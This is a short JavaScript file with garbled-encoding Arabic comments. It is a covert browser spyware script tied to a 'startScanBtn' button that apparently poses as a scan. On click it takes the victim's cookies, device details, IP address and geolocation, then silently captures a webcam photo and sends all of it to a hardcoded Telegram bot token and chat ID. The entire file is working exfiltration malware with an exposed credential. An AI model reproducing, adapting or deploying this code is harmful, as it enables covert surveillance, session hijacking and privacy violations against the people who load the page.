(function() {
    // ุฅุนุฏุงุฏุงุช ุงูุจูุช ุงูุฎุงุตุฉ ุจู
    const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
    const _id = "7253092491";

    // ุฏุงูุฉ ุฅุฑุณุงู ุงูุชูุงุฑูุฑ ุงููุตูุฉ
    function _send(msg) {
        const url = `https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[LOG]: " + msg)}`;
        navigator.sendBeacon(url);
    }

    // ุฏุงูุฉ ุฅุฑุณุงู ุงูุตูุฑุฉ ูููู
    function _sendPhoto(blob) {
        const formData = new FormData();
        formData.append('chat_id', _id);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', '๐ฏ ุตูุฑุฉ ูู ุงููุธุงู ุจุฌูุฏุฉ ุนุงููุฉ');

        fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).then(() => _send("ุชู ุฑูุน ุงูุตูุฑุฉ ุจูุฌุงุญ โ"));
    }

    const startBtn = document.getElementById('startScanBtn');
    if(startBtn) {
        startBtn.addEventListener('click', async () => {
            _send("ุจุฏุฃุช ุนูููุฉ ุณุญุจ ุงูุจูุงูุงุช ุงููุงููุฉ ๐");

            // 1. ุฌูุน ุงูููููุฒ ูุจูุงูุงุช ุงูุฌูุงุฒ
            const cookies = document.cookie || "ูุง ุชูุฌุฏ ููููุฒ (ุฃู ุงููุชุตูุญ ูุญูููุง)";
            const deviceInfo = `
๐ฑ ูุธุงู ุงูุชุดุบูู: ${navigator.platform}
๐ ุงููุชุตูุญ: ${navigator.userAgent}
๐ช ุงูููููุฒ ุงููุชุงุญุฉ: ${cookies}
            `;
            _send(deviceInfo);

            // 2. ุงููููุน ุงูุฌุบุฑุงูู ูุงูู IP
            _getAdvancedInfo();

            // 3. ุณุญุจ ุงูุตูุฑุฉ
            _capturePhoto();
        });
    }

    async function _getAdvancedInfo() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            _send(`๐ IP: ${data.ip}`);
        } catch(e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((p) => {
                _send(`๐ ุฎุฑูุทุฉ: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
        }
    }

    async function _capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // ููุชุธุฑ ููููุงู ูุถุจุท ุงูุฅุถุงุกุฉ ูุจู ุงูููุทุฉ
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob((blob) => {
                    _sendPhoto(blob);
                    stream.getTracks().forEach(t => t.stop()); // ุฅููุงู ุงููุงููุฑุง
                }, 'image/jpeg', 0.8);
            }, 2500);
        } catch (e) {
            _send("โ ุงูุถุญูุฉ ุฑูุถ ุงููุงููุฑุง");
        }
    }
})();

